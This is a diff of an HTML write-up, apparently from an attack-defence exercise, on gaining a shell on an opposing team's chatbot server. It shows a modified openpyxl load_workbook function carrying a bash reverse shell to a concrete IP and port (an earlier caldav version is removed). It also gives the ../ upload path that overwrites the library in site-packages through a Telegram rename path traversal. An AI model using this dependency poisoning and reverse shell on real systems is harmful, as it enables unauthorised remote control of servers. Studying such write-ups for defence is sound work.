@@ -836,44 +836,47 @@ await tg_file.download_to_drive(path)</code></pre>
             <h5>Phase 1: Reconnaissance</h5>
             <p>Since we did not find a way to make the docker container crash, we looked for another way to inject malicious code at runtime.</p>
 
-            <p>We discovered that inside the <code>tools/calendar_tools</code> the <code>caldav</code> Pyton library was imported as follow:</p>
-
-            <pre><code class="language-python">import caldav</code></pre>
-
-            <p>And that it called the <code>DAVClient</code> class <code>__init__</code> method like this:</p>
-
-            <pre><code class="language-python">client = caldav.DAVClient(url=URL, username=USERNAME, password=PASSWORD)</code></pre>
-
-            <p>Making the Python programm depend on the <code>.venv/lib/python3.13/site-packages/caldav/davclient.py</code> during runtime.</p>
+            <p>We discovered that the application used the <code>openpyxl</code> library to handle Excel files. The <code>load_workbook</code> function in <code>openpyxl/reader/excel.py</code> is called whenever an Excel file is processed by the system.</p>
 
             <p>This meant that we had an entry point!</p>
 
             <h5>Phase 2: Poisoning the Dependency</h5>
-            <p>We prepared a modified version of <code>davclient.py</code> from the <code>caldav</code> package. The <code>__init__</code> method of the <code>DavClient</code> class was modified with a reverse shell payload:</p>
+            <p>We prepared a modified version of <code>excel.py</code> from the <code>openpyxl</code> package. The <code>load_workbook</code> function was modified with a reverse shell payload:</p>
 
-            <pre><code class="language-python"># Modified davclient.py
-import subprocess
+            <pre><code class="language-python">def load_workbook(
+    filename,
+    read_only=False,
+    keep_vba=KEEP_VBA,
+    data_only=False,
+    keep_links=True,
+    rich_text=False,
+):
+    """Open the given filename and return the workbook"""
+    reader = ExcelReader(
+        filename, read_only, keep_vba, data_only, keep_links, rich_text
+    )
 
-class DavClient:
-    def __init__(self):
-        # Malicious Reverse Shell Payload
-        subprocess.Popen(
-            ["bash", "-c", "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            stdin=subprocess.DEVNULL
-        )
-        # ... Rest of the original code</code></pre>
+    import subprocess
+
+    subprocess.Popen(
+        ["bash", "-c", "bash -i >& /dev/tcp/83.228.249.140/4444 0>&1"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        stdin=subprocess.DEVNULL,
+    )
+
+    reader.read()
+    return reader.wb</code></pre>
 
             <h5>Phase 3: Delivery via Path Traversal</h5>
             <p>Using the Telegram Desktop rename feature, we uploaded the poisoned file with the following path:</p>
 
-            <pre><code>../.venv/lib/python3.13/site-packages/caldav/davclient.py</code></pre>
+            <pre><code>../.venv/lib/python3.13/site-packages/openpyxl/reader/excel.py</code></pre>
 
             <p>This overwrote the legitimate library file with our malicious variant. The server's operating system followed the <code>../</code> sequences, navigated out of the upload directory, and wrote directly into the virtual environment's site-packages.</p>
 
             <h5>Phase 4: Silent Execution</h5>
-            <p>The payload remained dormant until a legitimate user action triggered the library import. When any user ask the chatbot to check doctor availability, the bot instantiated the <code>DavClient</code> class. This instantiation executed our injected reverse shell code, establishing a connection to our listener.</p>
+            <p>The payload remained dormant until the library was triggered. For the reverse shell to execute, we either needed to be the first to upload an <code>.xlsx</code> file (triggering the <code>load_workbook</code> function), or wait for Team Omega to perform a docker restart, which would reload the poisoned module. Once triggered, our injected reverse shell code established a connection to our listener.</p>
 
             <h4>The Result</h4>
             <p>The bot continued operating normally from the user's perspective. Simultaneously, we gained a fully interactive shell with the same privileges as the bot's process. This provided:</p>
